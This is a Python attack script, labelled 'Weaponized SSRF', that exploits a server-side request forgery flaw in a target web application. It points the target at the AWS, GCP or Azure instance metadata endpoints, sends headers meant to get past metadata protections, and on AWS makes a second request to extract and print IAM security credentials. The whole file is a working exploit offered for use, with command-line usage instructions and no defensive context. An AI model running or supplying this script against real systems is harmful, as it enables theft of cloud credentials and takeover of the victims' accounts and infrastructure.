import sys
import requests
import json

def exploit_ssrf(target_url, param, cloud_provider):
    """
    Weaponized SSRF: Targets the link-local metadata service to 
    extract temporary security credentials/tokens.
    """
    providers = {
        "aws": "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
        "gcp": "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token",
        "azure": "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/"
    }
    
    # Bypass headers for GCP/Azure metadata protections
    headers = {
        "Metadata-Flavor": "Google",
        "Metadata": "true",
        "X-Forwarded-For": "127.0.0.1"
    }

    if cloud_provider not in providers:
        print(f"[-] Unsupported provider: {cloud_provider}")
        return

    endpoint = providers[cloud_provider]
    print(f"[*] Triggering SSRF on {target_url} -> Targeting {cloud_provider} metadata...")
    
    try:
        # Initial probe to find the role name (for AWS)
        payload = {param: endpoint}
        r = requests.get(target_url, params=payload, headers=headers, timeout=5)
        
        if r.status_code == 200:
            print("[!] INITIAL ACCESS GRANTED. Response preview:")
            print(r.text[:200])
            
            # If AWS, we need a second hop to get the actual JSON credentials
            if cloud_provider == "aws" and not r.text.startswith('{'):
                role_name = r.text.strip()
                final_endpoint = f"{endpoint}{role_name}"
                r_final = requests.get(target_url, params={param: final_endpoint}, headers=headers)
                print(f"[!!!] CREDENTIALS EXFILTRATED:\n{r_final.text}")
        else:
            print(f"[-] Probe failed with status: {r.status_code}")
            
    except Exception as e:
        print(f"[-] Execution Fault: {e}")

if __name__ == "__main__":
    if len(sys.argv) < 4:
        print("Usage: 125_ssrf <vulnerable_url> <param_name> <aws|gcp|azure>")
        sys.exit(1)
    exploit_ssrf(sys.argv[1], sys.argv[2], sys.argv[3].lower())
